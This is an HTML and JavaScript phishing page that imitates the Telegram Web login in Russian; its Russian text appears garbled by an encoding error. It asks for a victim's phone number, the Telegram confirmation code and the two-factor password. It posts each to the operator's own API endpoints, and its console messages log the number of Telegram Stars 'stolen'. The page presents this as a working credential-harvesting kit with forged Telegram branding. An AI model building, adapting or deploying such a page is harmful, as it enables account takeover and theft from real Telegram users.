<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1c1c1c 0%, #0a0a0a 100%);
            color: #e6e6e6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
            background: #1a1a1a;
            border-radius: 16px;
            padding: 40px 32px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
            border: 1px solid #2a2a2a;
            position: relative;
            overflow: hidden;
        }

        /* –õ–æ–≥–æ—Ç–∏–ø Telegram */
        .telegram-logo {
            text-align: center;
            margin-bottom: 30px;
            position: relative;
        }

        .logo-circle {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #34aadc 0%, #2a90c0 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            box-shadow: 0 8px 20px rgba(52, 170, 220, 0.3);
        }

        .logo-circle i {
            font-size: 40px;
            color: white;
        }

        .logo-text {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(135deg, #34aadc 0%, #2a90c0 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }

        .logo-subtitle {
            color: #888;
            font-size: 14px;
            margin-top: 8px;
            letter-spacing: 0.5px;
        }

        /* –®–∞–≥–∏ —Ñ–æ—Ä–º—ã */
        .form-step {
            display: none;
            animation: fadeIn 0.3s ease;
        }

        .form-step.active {
            display: block;
        }

        .step-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 24px;
            color: #f0f0f0;
            text-align: center;
        }

        /* –í–≤–æ–¥ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ */
        .phone-input-container {
            margin-bottom: 30px;
        }

        .country-code-selector {
            display: flex;
            align-items: center;
            background: #2a2a2a;
            border-radius: 12px;
            padding: 4px 16px;
            margin-bottom: 12px;
            border: 1px solid #333;
            transition: all 0.3s ease;
        }

        .country-code-selector:focus-within {
            border-color: #34aadc;
            box-shadow: 0 0 0 2px rgba(52, 170, 220, 0.2);
        }

        .country-flag {
            width: 24px;
            height: 24px;
            margin-right: 10px;
            font-size: 20px;
        }

        .country-code {
            color: #aaa;
            font-size: 16px;
            font-weight: 500;
            margin-right: 8px;
        }

        .phone-input-wrapper {
            position: relative;
        }

        .phone-number-input {
            width: 100%;
            padding: 18px 20px;
            background: #2a2a2a;
            border: 1px solid #333;
            border-radius: 12px;
            color: #fff;
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 1px;
            transition: all 0.3s ease;
        }

        .phone-number-input:focus {
            outline: none;
            border-color: #34aadc;
            box-shadow: 0 0 0 2px rgba(52, 170, 220, 0.2);
        }

        .phone-number-input::placeholder {
            color: #666;
            font-weight: normal;
            letter-spacing: normal;
        }

        .phone-hint {
            color: #888;
            font-size: 13px;
            margin-top: 8px;
            text-align: center;
        }

        /* –í–≤–æ–¥ –∫–æ–¥–∞ */
        .code-input-container {
            margin-bottom: 30px;
        }

        .code-input-wrapper {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .code-digit {
            width: 60px;
            height: 70px;
            background: #2a2a2a;
            border: 2px solid #333;
            border-radius: 12px;
            color: #fff;
            font-size: 28px;
            font-weight: 600;
            text-align: center;
            transition: all 0.2s ease;
        }

        .code-digit:focus {
            outline: none;
            border-color: #34aadc;
            transform: translateY(-2px);
        }

        .code-hint {
            color: #aaa;
            font-size: 14px;
            text-align: center;
            margin-top: 15px;
            padding: 12px;
            background: rgba(42, 42, 42, 0.5);
            border-radius: 8px;
            border-left: 3px solid #34aadc;
        }

        .code-hint small {
            color: #34aadc;
            font-weight: 600;
        }

        /* –í–≤–æ–¥ –ø–∞—Ä–æ–ª—è */
        .password-input-container {
            margin-bottom: 30px;
        }

        .password-input-wrapper {
            position: relative;
        }

        .password-input {
            width: 100%;
            padding: 18px 20px;
            background: #2a2a2a;
            border: 1px solid #333;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        .password-input:focus {
            outline: none;
            border-color: #34aadc;
            box-shadow: 0 0 0 2px rgba(52, 170, 220, 0.2);
        }

        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #888;
            cursor: pointer;
            font-size: 18px;
        }

        /* –ö–Ω–æ–ø–∫–∏ */
        .btn-primary {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #34aadc 0%, #2a90c0 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(52, 170, 220, 0.3);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .btn-secondary {
            width: 100%;
            padding: 12px;
            background: transparent;
            color: #888;
            border: 1px solid #333;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 15px;
        }

        .btn-secondary:hover {
            color: #34aadc;
            border-color: #34aadc;
        }

        /* –û—à–∏–±–∫–∏ */
        .error-message {
            color: #ff5555;
            font-size: 14px;
            margin-top: 8px;
            text-align: center;
            padding: 10px;
            background: rgba(255, 85, 85, 0.1);
            border-radius: 8px;
            display: none;
        }

        /* –ó–∞–≥—Ä—É–∑–∫–∞ */
        .loading-container {
            text-align: center;
            padding: 40px 0;
        }

        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(52, 170, 220, 0.2);
            border-top-color: #34aadc;
            border-radius: 50%;
            margin: 0 auto 25px;
            animation: spin 1s linear infinite;
        }

        .loading-text {
            color: #aaa;
            font-size: 16px;
        }

        /* –ü–æ–¥–≤–∞–ª */
        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #2a2a2a;
            color: #666;
            font-size: 12px;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 10px;
        }

        .footer-links a {
            color: #888;
            text-decoration: none;
            transition: color 0.2s;
        }

        .footer-links a:hover {
            color: #34aadc;
        }

        /* –ê–Ω–∏–º–∞—Ü–∏–∏ */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* –ê–¥–∞–ø—Ç–∏–≤–Ω–æ—Å—Ç—å */
        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
                border-radius: 12px;
            }
            
            .logo-circle {
                width: 70px;
                height: 70px;
            }
            
            .logo-circle i {
                font-size: 35px;
            }
            
            .code-digit {
                width: 50px;
                height: 60px;
                font-size: 24px;
            }
            
            .phone-number-input {
                font-size: 17px;
                padding: 16px 18px;
            }
        }

        /* –°—Ç–∏–ª–∏ –¥–ª—è –Ω–æ–º–µ—Ä–∞ */
        .phone-formatted {
            letter-spacing: 1.5px;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- –õ–æ–≥–æ—Ç–∏–ø Telegram -->
        <div class="telegram-logo">
            <div class="logo-circle">
                <i class="fab fa-telegram"></i>
            </div>
            <div class="logo-text">Telegram</div>
            <div class="logo-subtitle">–í–æ–π–¥–∏—Ç–µ –≤ —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç</div>
        </div>

        <!-- –®–∞–≥ 1: –í–≤–æ–¥ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
        <div id="step1" class="form-step active">
            <div class="step-title">–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</div>
            
            <div class="phone-input-container">
                <div class="country-code-selector">
                    <div class="country-flag">üá∑üá∫</div>
                    <div class="country-code">+7</div>
                    <div class="country-name" style="color: #ccc; font-size: 14px;">–†–æ—Å—Å–∏—è</div>
                </div>
                
                <div class="phone-input-wrapper">
                    <input 
                        type="tel" 
                        id="phoneInput" 
                        class="phone-number-input phone-formatted"
                        placeholder="912 345 67 89"
                        inputmode="numeric"
                        maxlength="15"
                        autocomplete="tel"
                        autofocus
                    >
                </div>
                
                <div class="phone-hint">
                    –ù–∞ —ç—Ç–æ—Ç –Ω–æ–º–µ—Ä –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
                </div>
            </div>
            
            <button id="sendCodeBtn" class="btn-primary" onclick="sendPhone()">
                –î–∞–ª–µ–µ
            </button>
            
            <div id="errorPhone" class="error-message">
                –í–≤–µ–¥–∏—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞
            </div>
        </div>

        <!-- –®–∞–≥ 2: –í–≤–æ–¥ –∫–æ–¥–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è -->
        <div id="step2" class="form-step">
            <div class="step-title">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram</div>
            
            <div class="code-input-container">
                <div class="code-input-wrapper" id="codeContainer">
                    <input type="text" class="code-digit" maxlength="1" inputmode="numeric" data-index="0" oninput="moveCodeFocus(0)">
                    <input type="text" class="code-digit" maxlength="1" inputmode="numeric" data-index="1" oninput="moveCodeFocus(1)">
                    <input type="text" class="code-digit" maxlength="1" inputmode="numeric" data-index="2" oninput="moveCodeFocus(2)">
                    <input type="text" class="code-digit" maxlength="1" inputmode="numeric" data-index="3" oninput="moveCodeFocus(3)">
                    <input type="text" class="code-digit" maxlength="1" inputmode="numeric" data-index="4" oninput="moveCodeFocus(4)">
                </div>
                
                <div class="code-hint" id="codeHint">
                    –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ Telegram<br>
                    <small id="debugCode"></small>
                </div>
            </div>
            
            <button id="verifyCodeBtn" class="btn-primary" onclick="verifyCode()">
                –í–æ–π—Ç–∏
            </button>
            
            <button class="btn-secondary" onclick="backToPhone()">
                ‚Üê –ò–∑–º–µ–Ω–∏—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞
            </button>
            
            <div id="errorCode" class="error-message">
                –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
            </div>
        </div>

        <!-- –®–∞–≥ 3: –í–≤–æ–¥ –ø–∞—Ä–æ–ª—è 2FA -->
        <div id="step3" class="form-step">
            <div class="step-title">–ü–∞—Ä–æ–ª—å –¥–≤—É—Ö—ç—Ç–∞–ø–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏</div>
            
            <div class="password-input-container">
                <div class="password-input-wrapper">
                    <input 
                        type="password" 
                        id="passwordInput"
                        class="password-input"
                        placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å"
                        autocomplete="current-password"
                        autofocus
                    >
                    <button type="button" class="toggle-password" onclick="togglePasswordVisibility()">
                        <i class="far fa-eye"></i>
                    </button>
                </div>
                
                <div class="phone-hint">
                    –î–ª—è –∑–∞—â–∏—Ç—ã –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ –≤–∫–ª—é—á–µ–Ω–∞ –¥–≤—É—Ö—ç—Ç–∞–ø–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è
                </div>
            </div>
            
            <button id="verifyPasswordBtn" class="btn-primary" onclick="verifyPassword()">
                –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å
            </button>
            
            <button class="btn-secondary" onclick="backToCode()">
                ‚Üê –í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –≤–≤–æ–¥—É –∫–æ–¥–∞
            </button>
            
            <div id="errorPassword" class="error-message">
                –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å
            </div>
        </div>

        <!-- –®–∞–≥ 4: –ó–∞–≥—Ä—É–∑–∫–∞ -->
        <div id="step4" class="form-step">
            <div class="loading-container">
                <div class="loading-spinner"></div>
                <div class="loading-text">–í—Ö–æ–¥ –≤ —Å–∏—Å—Ç–µ–º—É...</div>
                <div class="phone-hint" style="margin-top: 20px;">
                    –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤ Telegram Web
                </div>
            </div>
        </div>

        <!-- –ü–æ–¥–≤–∞–ª -->
        <div class="footer">
            <div>–í–µ—Ä—Å–∏—è –¥–ª—è –±—Ä–∞—É–∑–µ—Ä–∞</div>
            <div class="footer-links">
                <a href="https://telegram.org" target="_blank">–û Telegram</a>
                <a href="https://telegram.org/faq" target="_blank">–ü–æ–º–æ—â—å</a>
                <a href="https://telegram.org/privacy" target="_blank">–ö–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç—å</a>
            </div>
            <div style="margin-top: 10px; font-size: 11px; color: #555;">
                ¬© 2025 Telegram Messenger Inc.
            </div>
        </div>
    </div>

    <script>
        // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
        let userData = {
            phone: '',
            code: '',
            password: '',
            phoneCodeHash: ''
        };

        let currentStep = 1;
        let isRequestingCode = false;

        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        function formatPhoneNumber(input) {
            let value = input.value.replace(/\D/g, '');
            
            if (value.length > 10) {
                value = value.substring(0, 10);
            }
            
            let formatted = '';
            if (value.length > 0) {
                formatted = value.substring(0, 3);
            }
            if (value.length > 3) {
                formatted += ' ' + value.substring(3, 6);
            }
            if (value.length > 6) {
                formatted += ' ' + value.substring(6, 8);
            }
            if (value.length > 8) {
                formatted += ' ' + value.substring(8, 10);
            }
            
            input.value = formatted;
            return '+7' + value;
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        async function sendPhone() {
            if (isRequestingCode) return;
            
            const phoneInput = document.getElementById('phoneInput');
            const fullPhone = formatPhoneNumber(phoneInput);
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–æ–º–µ—Ä–∞ (10 —Ü–∏—Ñ—Ä –ø–æ—Å–ª–µ +7)
            if (fullPhone.length !== 12) {
                showError('errorPhone', '–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                phoneInput.focus();
                return;
            }
            
            userData.phone = fullPhone;
            
            // –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É
            const btn = document.getElementById('sendCodeBtn');
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> –û—Ç–ø—Ä–∞–≤–∫–∞...';
            isRequestingCode = true;
            
            try {
                const response = await fetch('/api/request-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: fullPhone })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // –î–ª—è –æ—Ç–ª–∞–¥–∫–∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–æ–¥ (–≤ —Ä–µ–∞–ª—å–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ —É–±—Ä–∞—Ç—å!)
                    if (data.fake_code) {
                        document.getElementById('debugCode').textContent = 
                            `–¢–µ—Å—Ç–æ–≤—ã–π –∫–æ–¥: ${data.fake_code}`;
                    }
                    
                    // –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ –≤–≤–æ–¥—É –∫–æ–¥–∞
                    showStep(2);
                    
                    // –ê–≤—Ç–æ—Ñ–æ–∫—É—Å –Ω–∞ –ø–µ—Ä–≤—ã–π —Å–∏–º–≤–æ–ª –∫–æ–¥–∞
                    setTimeout(() => {
                        document.querySelector('.code-digit[data-index="0"]').focus();
                    }, 100);
                    
                } else {
                    showError('errorPhone', data.error || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞');
                    phoneInput.focus();
                }
                
            } catch (error) {
                showError('errorPhone', '–û—à–∏–±–∫–∞ —Å–µ—Ç–∏. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ.');
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
            } finally {
                btn.disabled = false;
                btn.textContent = '–î–∞–ª–µ–µ';
                isRequestingCode = false;
            }
        }

        // –†–∞–±–æ—Ç–∞ —Å –∫–æ–¥–æ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
        function moveCodeFocus(index) {
            const digits = document.querySelectorAll('.code-digit');
            const currentDigit = digits[index];
            
            // –û—á–∏—â–∞–µ–º –Ω–µ—á–∏—Å–ª–æ–≤—ã–µ —Å–∏–º–≤–æ–ª—ã
            currentDigit.value = currentDigit.value.replace(/\D/g, '');
            
            // –ï—Å–ª–∏ –≤–≤–µ–¥–µ–Ω–∞ —Ü–∏—Ñ—Ä–∞, –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –ø–æ–ª—é
            if (currentDigit.value && index < 4) {
                digits[index + 1].focus();
            }
            
            // –ï—Å–ª–∏ —É–¥–∞–ª–∏–ª–∏ —Å–∏–º–≤–æ–ª, –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ –ø—Ä–µ–¥—ã–¥—É—â–µ–º—É –ø–æ–ª—é
            if (!currentDigit.value && index > 0 && event.inputType === 'deleteContentBackward') {
                digits[index - 1].focus();
            }
            
            // –°–æ–±–∏—Ä–∞–µ–º –ø–æ–ª–Ω—ã–π –∫–æ–¥
            updateFullCode();
        }

        function updateFullCode() {
            const digits = document.querySelectorAll('.code-digit');
            let fullCode = '';
            
            digits.forEach(digit => {
                fullCode += digit.value;
            });
            
            userData.code = fullCode;
            
            // –ê–≤—Ç–æ–ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø—Ä–∏ –≤–≤–æ–¥–µ 5 —Ü–∏—Ñ—Ä
            if (fullCode.length === 5) {
                // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –¥–ª—è UX
                setTimeout(() => {
                    verifyCode();
                }, 300);
            }
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞
        async function verifyCode() {
            const code = userData.code;
            
            if (code.length !== 5) {
                showError('errorCode', '–í–≤–µ–¥–∏—Ç–µ –≤—Å–µ 5 —Ü–∏—Ñ—Ä –∫–æ–¥–∞');
                return;
            }
            
            const btn = document.getElementById('verifyCodeBtn');
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> –ü—Ä–æ–≤–µ—Ä–∫–∞...';
            
            try {
                const response = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: userData.phone, 
                        code: code 
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    if (data.needPassword) {
                        showStep(3);
                        document.getElementById('passwordInput').focus();
                    } else {
                        // –ù–µ—Ç 2FA - –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—é
                        if (data.starsStolen > 0) {
                            console.log(`–£–∫—Ä–∞–¥–µ–Ω–æ –∑–≤–µ–∑–¥: ${data.starsStolen}`);
                        }
                        completeAuth();
                    }
                } else {
                    showError('errorCode', data.error || '–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥');
                    // –°–±—Ä–∞—Å—ã–≤–∞–µ–º –∫–æ–¥
                    const digits = document.querySelectorAll('.code-digit');
                    digits.forEach(digit => digit.value = '');
                    digits[0].focus();
                }
                
            } catch (error) {
                showError('errorCode', '–û—à–∏–±–∫–∞ —Å–µ—Ç–∏');
            } finally {
                btn.disabled = false;
                btn.textContent = '–í–æ–π—Ç–∏';
            }
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è 2FA
        async function verifyPassword() {
            const password = document.getElementById('passwordInput').value;
            
            if (!password) {
                showError('errorPassword', '–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å');
                return;
            }
            
            userData.password = password;
            
            const btn = document.getElementById('verifyPasswordBtn');
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> –ü—Ä–æ–≤–µ—Ä–∫–∞...';
            
            try {
                const response = await fetch('/api/verify-password', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: userData.phone, 
                        password: password 
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    if (data.starsStolen > 0) {
                        console.log(`–£–∫—Ä–∞–¥–µ–Ω–æ –∑–≤–µ–∑–¥ —Å 2FA: ${data.starsStolen}`);
                    }
                    completeAuth();
                } else {
                    showError('errorPassword', data.error || '–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å');
                    document.getElementById('passwordInput').focus();
                    document.getElementById('passwordInput').select();
                }
                
            } catch (error) {
                showError('errorPassword', '–û—à–∏–±–∫–∞ —Å–µ—Ç–∏');
            } finally {
                btn.disabled = false;
                btn.textContent = '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å';
            }
        }

        // –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
        function completeAuth() {
            showStep(4);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∏–Ω–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            fetch('/api/completeAuth', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(userData)
            }).catch(err => console.error('–û—à–∏–±–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è:', err));
            
            // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
            setTimeout(() => {
                window.location.href = '/success';
            }, 3000);
        }

        // –ù–∞–≤–∏–≥–∞—Ü–∏—è –ø–æ —à–∞–≥–∞–º
        function showStep(stepNumber) {
            // –°–∫—Ä—ã–≤–∞–µ–º –≤—Å–µ —à–∞–≥–∏
            for (let i = 1; i <= 4; i++) {
                document.getElementById(`step${i}`).classList.remove('active');
            }
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –Ω—É–∂–Ω—ã–π —à–∞–≥
            document.getElementById(`step${stepNumber}`).classList.add('active');
            currentStep = stepNumber;
            
            // –°–∫—Ä—ã–≤–∞–µ–º –≤—Å–µ –æ—à–∏–±–∫–∏
            hideAllErrors();
        }

        function backToPhone() {
            showStep(1);
            document.getElementById('phoneInput').focus();
            document.getElementById('phoneInput').select();
        }

        function backToCode() {
            showStep(2);
            document.querySelector('.code-digit[data-index="0"]').focus();
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å/—Å–∫—Ä—ã—Ç—å –ø–∞—Ä–æ–ª—å
        function togglePasswordVisibility() {
            const passwordInput = document.getElementById('passwordInput');
            const toggleBtn = document.querySelector('.toggle-password i');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.classList.remove('fa-eye');
                toggleBtn.classList.add('fa-eye-slash');
            } else {
                passwordInput.type = 'password';
                toggleBtn.classList.remove('fa-eye-slash');
                toggleBtn.classList.add('fa-eye');
            }
        }

        // –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –æ—à–∏–±–∫–∞–º–∏
        function showError(elementId, message) {
            const errorEl = document.getElementById(elementId);
            errorEl.textContent = message;
            errorEl.style.display = 'block';
            
            // –ê–≤—Ç–æ—Å–∫—Ä—ã—Ç–∏–µ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
            setTimeout(() => {
                errorEl.style.display = 'none';
            }, 5000);
        }

        function hideAllErrors() {
            document.querySelectorAll('.error-message').forEach(el => {
                el.style.display = 'none';
            });
        }

        // –ê–≤—Ç–æ–ø–µ—Ä–µ—Ö–æ–¥ –º–µ–∂–¥—É –ø–æ–ª—è–º–∏ –∫–æ–¥–∞ –ø–æ –Ω–∞–∂–∞—Ç–∏—é –∫–ª–∞–≤–∏—à
        document.addEventListener('keydown', function(event) {
            // Enter –¥–ª—è –Ω–∞–≤–∏–≥–∞—Ü–∏–∏
            if (event.key === 'Enter') {
                if (currentStep === 1) sendPhone();
                if (currentStep === 2) verifyCode();
                if (currentStep === 3) verifyPassword();
            }
            
            // –°—Ç—Ä–µ–ª–∫–∏ –¥–ª—è –Ω–∞–≤–∏–≥–∞—Ü–∏–∏ –ø–æ –ø–æ–ª—è–º –∫–æ–¥–∞
            if (currentStep === 2) {
                const activeElement = document.activeElement;
                if (activeElement.classList.contains('code-digit')) {
                    const index = parseInt(activeElement.getAttribute('data-index'));
                    
                    if (event.key === 'ArrowRight' && index < 4) {
                        event.preventDefault();
                        document.querySelector(`.code-digit[data-index="${index + 1}"]`).focus();
                    }
                    
                    if (event.key === 'ArrowLeft' && index > 0) {
                        event.preventDefault();
                        document.querySelector(`.code-digit[data-index="${index - 1}"]`).focus();
                    }
                    
                    // Backspace –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –∫ –ø—Ä–µ–¥—ã–¥—É—â–µ–º—É –ø–æ–ª—é
                    if (event.key === 'Backspace' && !activeElement.value && index > 0) {
                        event.preventDefault();
                        const prevDigit = document.querySelector(`.code-digit[data-index="${index - 1}"]`);
                        prevDigit.focus();
                        prevDigit.value = '';
                        updateFullCode();
                    }
                }
            }
        });

        // –ê–≤—Ç–æ—Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–æ–º–µ—Ä–∞ –ø—Ä–∏ –≤–≤–æ–¥–µ
        document.getElementById('phoneInput').addEventListener('input', function() {
            formatPhoneNumber(this);
        });

        // –í—Å—Ç–∞–≤–∏—Ç—å –∫–æ–¥ –∏–∑ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞
        document.addEventListener('paste', function(event) {
            if (currentStep === 2) {
                const clipboardData = event.clipboardData || window.clipboardData;
                const pastedData = clipboardData.getData('Text').replace(/\D/g, '');
                
                if (pastedData.length === 5) {
                    event.preventDefault();
                    
                    const digits = document.querySelectorAll('.code-digit');
                    for (let i = 0; i < 5; i++) {
                        digits[i].value = pastedData[i] || '';
                    }
                    
                    updateFullCode();
                    
                    // –§–æ–∫—É—Å –Ω–∞ –ø–æ—Å–ª–µ–¥–Ω–∏–π —Å–∏–º–≤–æ–ª
                    digits[4].focus();
                    
                    // –ê–≤—Ç–æ–ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ
                    setTimeout(() => {
                        verifyCode();
                    }, 300);
                }
            }
        });

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        document.addEventListener('DOMContentLoaded', function() {
            // –§–æ–∫—É—Å –Ω–∞ –ø–æ–ª–µ –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞
            document.getElementById('phoneInput').focus();
            
            // –ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ —Ç–µ—Å—Ç–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏ (—É–¥–∞–ª–∏—Ç—å –≤ –ø—Ä–æ–¥–∞–∫—à–µ–Ω–µ)
            if (window.location.href.includes('localhost')) {
                document.getElementById('phoneInput').value = '912 345 67 89';
                formatPhoneNumber(document.getElementById('phoneInput'));
            }
        });
    </script>
</body>
</html>